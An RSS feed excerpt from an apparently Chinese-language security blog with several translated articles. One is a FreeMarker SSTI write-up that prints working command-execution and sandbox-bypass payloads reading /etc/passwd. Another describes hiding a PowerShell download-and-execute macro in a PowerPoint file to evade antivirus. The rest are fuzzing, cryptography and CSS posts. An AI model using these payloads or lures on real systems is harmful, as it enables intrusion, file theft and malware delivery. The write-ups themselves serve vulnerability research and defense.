&lt;li&gt;密钥承诺：两个额外的AES加密块&lt;/li&gt;
&lt;li&gt;1 GB明文的额外总开销：五个AES-128块，两个额外的AES-128密钥调度&lt;/li&gt;
&lt;li&gt;1 TB明文的额外总开销：21个AES-128块，17个额外的AES-128密钥调度&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;其他想法&lt;/strong&gt;
可能还有我们尚未想象的另一种选择。找到最佳权衡，特别是在考虑硬件设计时，是我们在NIST研讨会上展示GEM的原因之一。&lt;/p&gt;
&lt;h2 id=&#34;切割gem&#34;&gt;切割GEM
&lt;/h2&gt;&lt;p&gt;IETF的CFRG目前正在讨论一种修改后的AES-GCM变体的RFC草案，称为GCM-SST，它对短标签是安全的。他们的设计出于性能原因使用POLYVAL而不是GHASH，并使用带有第二个POLYVAL的第二个认证密钥（Q），所有这些都进行XOR。&lt;/p&gt;
&lt;p&gt;不出所料，这种额外的XOR并不能显著保护AES-GCM中短标签的弱点（尽管它确实使通常的攻击更昂贵）。&lt;/p&gt;
&lt;p&gt;我们对GEM的初始设计使用AES块密码置换GHASH输出，而不是简单地在多项式输出中引入额外的线性操作（XOR）。&lt;/p&gt;
&lt;p&gt;我们有兴趣与其他行业领导者合作，提供一种强调短标签用例（即WebRTC）的GEM变体。这种假设的变体（暂定名为CUT-GEM）可以使用POLYVAL代替GHASH，并使用基于时期的子密钥派生计划来减少每个数据包的性能影响。&lt;/p&gt;
&lt;h2 id=&#34;在哪里可以了解更多关于aes-gem的信息&#34;&gt;在哪里可以了解更多关于AES-GEM的信息？
&lt;/h2&gt;&lt;p&gt;有关AES-GEM的更多信息可在我们的GitHub上找到！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>突破壁垒：FreeMarker模板引擎中的SSTI漏洞实现远程代码执行</title>
        <link>http://localhost:1313/p/%E7%AA%81%E7%A0%B4%E5%A3%81%E5%9E%92freemarker%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%B8%AD%E7%9A%84ssti%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
        <pubDate>Sat, 02 Aug 2025 07:11:23 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%AA%81%E7%A0%B4%E5%A3%81%E5%9E%92freemarker%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%B8%AD%E7%9A%84ssti%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
        <description>&lt;h1 id=&#34;突破壁垒freemarker模板引擎中的ssti漏洞实现远程代码执行&#34;&gt;突破壁垒：FreeMarker模板引擎中的SSTI漏洞实现远程代码执行
&lt;/h1&gt;&lt;p&gt;2023年，我在使用旧版FreeMarker模板引擎的应用中发现了一个重大漏洞。该版本存在服务器端模板注入(SSTI)漏洞，使我能够实现远程代码执行(RCE)。报告问题后，公司立即实施了沙箱机制来缓解SSTI攻击风险。但由于仍在使用FreeMarker 3.2.30以下版本，存在已知的沙箱绕过漏洞。本文将深入分析这一发现，重点展示绕过沙箱机制的具体步骤。&lt;/p&gt;
&lt;h2 id=&#34;freemarker模板引擎工作原理&#34;&gt;FreeMarker模板引擎工作原理
&lt;/h2&gt;&lt;p&gt;FreeMarker是一款广泛采用的模板引擎，主要用于Java应用中将表现逻辑与业务逻辑分离。它允许开发者创建包含静态内容和动态占位符的模板，这些模板可以通过Java对象或数据库查询等数据源填充，最终生成动态输出。&lt;/p&gt;
&lt;p&gt;HTML转PDF的工作流程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;HTML结构定义&lt;/strong&gt;：在FreeMarker模板文件中定义HTML结构，包括内容、格式和样式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;FreeMarker指令&lt;/strong&gt;：使用&lt;code&gt;&amp;lt;#&lt;/code&gt;开头的指令动态填充数据，包括集合遍历、条件渲染和变量访问&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;指令块&lt;/strong&gt;：在指令中定义可条件执行或循环的代码块&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HTML渲染&lt;/strong&gt;：将模板与数据合并生成最终HTML&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;PDF转换&lt;/strong&gt;：使用HTML转PDF工具将生成的HTML转为PDF文档&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;漏洞发现过程&#34;&gt;漏洞发现过程
&lt;/h2&gt;&lt;p&gt;在应用测试阶段，我观察到&lt;code&gt;&amp;lt;#if&amp;gt;&lt;/code&gt;、&lt;code&gt;&amp;lt;#list&amp;gt;&lt;/code&gt;等标签的使用，确认应用使用了FreeMarker引擎。通过以下测试代码验证了引擎行为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;#assign test = .version&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;TEST FOR SSTI: ${3*3}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这些测试验证了引擎对特殊字符的处理、变量声明和基础运算能力。接着使用以下代码确认引擎版本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;#assign freemarkerVersion = .version&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FreeMarker version: ${freemarkerVersion}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;确认版本低于2.3.30，存在SSTI漏洞(CVE-2021-25770)。&lt;/p&gt;
&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;freemarker.template.utility.Execute&lt;/code&gt;类允许在模板中执行外部命令。构造如下payload可读取&lt;code&gt;/etc/passwd&lt;/code&gt;文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;${&amp;#34;freemarker.template.utility.Execute&amp;#34;?new()(&amp;#34;cat /etc/passwd&amp;#34;)}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;公司随后引入了沙箱环境作为防护措施。沙箱限制了模板引擎的操作能力，提供了安全执行环境。但旧版本仍存在绕过可能。&lt;/p&gt;
&lt;h2 id=&#34;沙箱绕过技术&#34;&gt;沙箱绕过技术
&lt;/h2&gt;&lt;p&gt;验证特殊字符处理和运算能力后，构建绕过payload：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign classloader=article.class.protectionDomain.classLoader&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign owc=classloader.loadClass(&amp;#34;freemarker.template.ObjectWrapper&amp;#34;)&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign dwf=owc.getField(&amp;#34;DEFAULT_WRAPPER&amp;#34;).get(null)&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#assign ec=classloader.loadClass(&amp;#34;freemarker.template.utility.Execute&amp;#34;)&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dwf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;newInstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;cat /etc/passwd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该payload通过反射获取类加载器，加载关键类并最终执行命令，成功绕过沙箱防护。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>使用AFL模糊测试《反恐精英：全球攻势》地图文件的技术实践</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8afl%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%8F%8D%E6%81%90%E7%B2%BE%E8%8B%B1%E5%85%A8%E7%90%83%E6%94%BB%E5%8A%BF%E5%9C%B0%E5%9B%BE%E6%96%87%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</link>
        <pubDate>Sat, 02 Aug 2025 06:54:57 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8afl%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%8F%8D%E6%81%90%E7%B2%BE%E8%8B%B1%E5%85%A8%E7%90%83%E6%94%BB%E5%8A%BF%E5%9C%B0%E5%9B%BE%E6%96%87%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%AE%9E%E8%B7%B5/</guid>
        <description>&lt;h1 id=&#34;使用afl模糊测试反恐精英全球攻势地图文件&#34;&gt;使用AFL模糊测试《反恐精英：全球攻势》地图文件
&lt;/h1&gt;&lt;p&gt;RealWorldCTF 2018有一个非常有趣的挑战叫做&amp;quot;P90 Rush B&amp;quot;，这是对Valve游戏《反恐精英：全球攻势》中一种战术的影射。该挑战要求发现并利用CS:GO服务器使用的地图文件加载器中的漏洞。&lt;/p&gt;
&lt;p&gt;在CTF期间，我利用了一个栈缓冲区溢出漏洞，后来另一个团队在他们的报告中很好地描述了这个漏洞。由于这个漏洞也影响了官方的CS:GO Windows客户端，符合Valve的漏洞赏金计划条件，实际上它只是一个旧报告的小变种，所以我在CTF结束后很快报告了它，并迅速得到了修复。&lt;/p&gt;
&lt;h2 id=&#34;bsp文件格式与攻击面&#34;&gt;BSP文件格式与攻击面
&lt;/h2&gt;&lt;p&gt;CS:GO（可能所有Source引擎游戏）使用的地图文件格式称为BSP，是二进制空间分割的缩写，这是一种方便的n维空间对象表示方法。然而，这种格式支持的远不止3D信息。BSP文件由服务器和客户端共同处理，因为两者都需要地图信息的某个子集来执行各自的任务。这是一个远程攻击面，因为客户端会在服务器发起的地图变更时从服务器下载未知地图。&lt;/p&gt;
&lt;h2 id=&#34;模糊测试设置&#34;&gt;模糊测试设置
&lt;/h2&gt;&lt;p&gt;为了简单起见，我决定模糊测试Linux服务器二进制文件，而不是实际的客户端（也可以在Linux上运行）。用这种方法显然无法发现客户端特有的问题，但我希望能找到共享代码中的低悬果实。&lt;/p&gt;
&lt;p&gt;我编写了一个简单的包装器来处理服务器二进制文件使用的共享库，最重要的几个是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;engine.so - 主要Source引擎代码（包含BSP解析器）&lt;/li&gt;
&lt;li&gt;dedicated.so - 专用服务器实现（包含应用程序入口点）&lt;/li&gt;
&lt;li&gt;libtier0.so - 可能与Steam/应用程序管理相关&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;afl修改&#34;&gt;AFL修改
&lt;/h2&gt;&lt;p&gt;我对AFL做了一些简单的修改：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;输入文件必须以.bsp结尾才能被GetModelForName正确解析&lt;/li&gt;
&lt;li&gt;需要能够指定自定义的fork服务器启动点&lt;/li&gt;
&lt;li&gt;增加等待fork时的超时乘数&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;漏洞分类与根因分析&#34;&gt;漏洞分类与根因分析
&lt;/h2&gt;&lt;p&gt;我们需要将&amp;quot;好&amp;quot;的漏洞与不感兴趣的漏洞（如纯越界读取）分开。我基于调用栈进行了简单的去重，然后在Valgrind中运行每个独特样本。&lt;/p&gt;
&lt;h2 id=&#34;经验总结&#34;&gt;经验总结
&lt;/h2&gt;&lt;p&gt;从这个小型项目中我学到了：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;AFL在QEMU模式下非常灵活，可以攻击特定代码段&lt;/li&gt;
&lt;li&gt;输入文件大小非常重要，从300KB降到16KB后性能至少提高了5倍&lt;/li&gt;
&lt;li&gt;分类对于筛选以前未经过模糊测试的代码库非常重要&lt;/li&gt;
&lt;li&gt;堆上的内存损坏不是一个安全问题 :)&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;示例漏洞cvirtualterrainlevelinit中的堆缓冲区溢出&#34;&gt;示例漏洞：CVirtualTerrain::LevelInit中的堆缓冲区溢出
&lt;/h2&gt;&lt;p&gt;在CVirtualTerrain::LevelInit中发生堆缓冲区溢出，因为dphysdisp_t::numDisplacements变量可能大于g_DispCollTreeCount，而检查这种情况的断言在发布版本中不存在。攻击者可以很大程度上控制堆内容，因此很可能被利用，特别是在Windows 7上许多模块没有启用ASLR的情况下。&lt;/p&gt;
&lt;p&gt;[附上一个BSP文件，其中numDisplacements = 0xffff且g_DispCollTreeCount = 2，可以可靠地使csgo.exe崩溃]&lt;/p&gt;
</description>
        </item>
        <item>
        <title>利用Veil-Evasion绕过杀毒软件检测的C2通信技术</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8veil-evasion%E7%BB%95%E8%BF%87%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B%E7%9A%84c2%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Sat, 02 Aug 2025 06:38:38 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8veil-evasion%E7%BB%95%E8%BF%87%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B%E7%9A%84c2%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h1 id=&#34;点击启用内容---绕过杀毒检测的c2通信技术&#34;&gt;点击启用内容 - 绕过杀毒检测的C2通信技术
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：本文所述技术可能已过时，但仍可作为学习现代工具技术演进的参考案例。&lt;/p&gt;
&lt;p&gt;在BHIS，绕过杀毒扫描已成为我们的&amp;quot;办公室运动&amp;quot;。在进行C2测试时，我们会从内网主机建立到C2服务器的反向连接，通过多种数据传递方式来测试防御系统的检测能力。我们的成功率很高（通常能成功外传数据），主要原因是恶意流量的识别极其困难——攻击者可以通过混淆技术使流量逃过杀毒软件和安全设备的检测。&lt;/p&gt;
&lt;h2 id=&#34;技术实现细节&#34;&gt;技术实现细节
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;监听器配置&lt;/strong&gt;&lt;br&gt;
在C2服务器设置443端口的反向TCP监听（选择443因其通常允许出站）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;载荷生成&lt;/strong&gt;&lt;br&gt;
使用Veil-Evasion工具生成混淆的PowerShell脚本载荷，该工具只需输入目标地址/端口及载荷类型即可自动生成代码。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;宏安全处理&lt;/strong&gt;&lt;br&gt;
原始生成的2300字符单行脚本会触发VB编辑器报错。通过&lt;code&gt;macro_safe.py&lt;/code&gt;脚本将长代码分割为VB可处理的片段：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# macro_safe.py处理示例&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 将长命令拆分为多行连接字符串&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;powershell -nop -w hidden -c &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;IEX ((new-object net.webclient).&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;downloadstring(&amp;#39;http://192.168.1.1/a&amp;#39;))&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;PPT宏植入&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将文档另存为&lt;code&gt;.pps&lt;/code&gt;（97-2003格式）避免&amp;quot;m&amp;quot;扩展名引起怀疑&lt;/li&gt;
&lt;li&gt;通过&amp;quot;开发工具&amp;quot;选项卡插入VB模块&lt;/li&gt;
&lt;li&gt;使用&amp;quot;鼠标点击&amp;quot;动作触发宏执行（覆盖整个首幻灯片的文本框）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;安全绕过实证&#34;&gt;安全绕过实证
&lt;/h2&gt;&lt;p&gt;测试扫描结果：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Gmail扫描器 ❌ 未检测&lt;/li&gt;
&lt;li&gt;Windows Defender ❌ 未检测&lt;/li&gt;
&lt;li&gt;McAfee ❌ 未检测&lt;/li&gt;
&lt;li&gt;Symantec ❌ 未检测&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;唯一防护是PowerPoint的主动内容警告，但用户往往因&amp;quot;错误消息疲劳&amp;quot;而忽略。这种技术揭示了单纯依赖杀毒软件的黑名单机制和用户教育的重要性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;如果必须让用户做安全决策，就必须持续教育他们认识潜在危险。&amp;rdquo; —— BHIS团队&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>经典卡通如何启发现代CSS动画技术</title>
        <link>http://localhost:1313/p/%E7%BB%8F%E5%85%B8%E5%8D%A1%E9%80%9A%E5%A6%82%E4%BD%95%E5%90%AF%E5%8F%91%E7%8E%B0%E4%BB%A3css%E5%8A%A8%E7%94%BB%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Sat, 02 Aug 2025 06:22:18 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%BB%8F%E5%85%B8%E5%8D%A1%E9%80%9A%E5%A6%82%E4%BD%95%E5%90%AF%E5%8F%91%E7%8E%B0%E4%BB%A3css%E5%8A%A8%E7%94%BB%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h1 id=&#34;粉碎动画系列第一部经典卡通如何启发现代css&#34;&gt;粉碎动画系列第一部：经典卡通如何启发现代CSS
&lt;/h1&gt;&lt;p&gt;浏览器厂商很快就在CSS中加入了运动功能。首先是简单的:hover伪类，随后是两种状态间的过渡动画。接着出现了通过@keyframes改变状态的能力，最近更是新增了与滚动位置联动的滚动驱动动画。&lt;/p&gt;
&lt;p&gt;即便有了这些增强功能，CSS动画仍然相对基础。这让我想起了小时候在电视上看到的汉纳-巴伯拉动画系列。&lt;/p&gt;
&lt;h2 id=&#34;低成本动画技术的启示&#34;&gt;低成本动画技术的启示
&lt;/h2&gt;&lt;p&gt;这些动画短片缺乏真人电影或动画大片的预算，也远低于威廉·汉纳和约瑟夫·巴伯拉在米高梅制作《猫和老鼠》时的资源。这意味着动画师需要开发技术来克服成本限制和当时的技术局限。&lt;/p&gt;
&lt;p&gt;他们采用每秒更少的帧数和更少的画格。不是为每一帧使用不同的图像，而是将每幅画面重复多次。通过缩放和叠加额外元素来构建新场景，尽可能重复使用画格。他们保持角色身体基本静止，通过叠加眼睛、嘴巴和腿部来制造说话和走路的假象。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;keyframes&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;background-scroll&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;background-position&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2750&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;px&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;background-position&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
